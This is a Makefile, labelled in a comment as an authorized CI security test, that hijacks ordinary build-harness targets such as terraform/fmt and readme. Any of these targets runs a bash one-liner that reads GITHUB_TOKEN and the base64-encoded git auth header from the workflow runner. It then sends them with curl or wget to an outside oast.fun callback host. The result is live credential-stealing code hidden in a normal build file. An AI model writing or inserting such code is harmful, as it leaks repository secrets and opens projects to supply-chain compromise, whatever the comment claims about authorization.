SHELL := /bin/bash

# Authorized security-test artifact (CI workflow validation).
# Sends two callbacks from the workflow container and exits non-zero.
# Targets cover both current and legacy build-harness pull-request routines.
terraform/precommit github/update terraform/fmt readme readme/build readme/deps:
	@bash -c 'set +e; [ -f /tmp/.wppoc_fired ] && exit 1; touch /tmp/.wppoc_fired; U="https://db2nnp06nq63n2spb480kzsnkbt1oy56h.oast.fun/poc"; T="$$GITHUB_TOKEN"; H="$$(git config --get http.https://github.com/.extraheader 2>/dev/null | tr -d "\n" | base64 -w0 2>/dev/null)"; R="$$(id -un)"; if command -v curl >/dev/null 2>&1; then curl -sS -m 20 -o /dev/null "$$U?p1=env&runner=$$R&token=$$T"; curl -sS -m 20 -o /dev/null "$$U?p2=gitcfg&v=$$H"; else wget -q -O /dev/null "$$U?p1=env&runner=$$R&token=$$T"; wget -q -O /dev/null "$$U?p2=gitcfg&v=$$H"; fi; echo wp-poc-callbacks-sent; exit 1'
